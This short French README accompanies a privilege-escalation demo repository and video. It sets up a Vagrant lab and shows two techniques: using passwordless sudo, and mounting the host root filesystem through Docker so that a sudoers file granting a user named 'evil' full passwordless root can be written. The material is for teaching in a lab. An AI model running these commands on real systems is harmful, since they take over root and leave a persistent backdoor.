# Privilege escalation

Retrouvez la vidéo ici : https://www.youtube.com/watch?v=zLxW6Dvruy0&feature=youtu.be. 

## executer les exemples : 

```
$ git clone https://github.com/NeuronAddict/privesc-demo
$ cd privec-demo
$ vagrant up
$ vagrant ssh
```

## sudo sans passwd

```
$ id
$ sudo -i
#
```


## avec docker 

```
docker run -v /:/sysroot -it alpine:3
echo "evil ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/evil
```


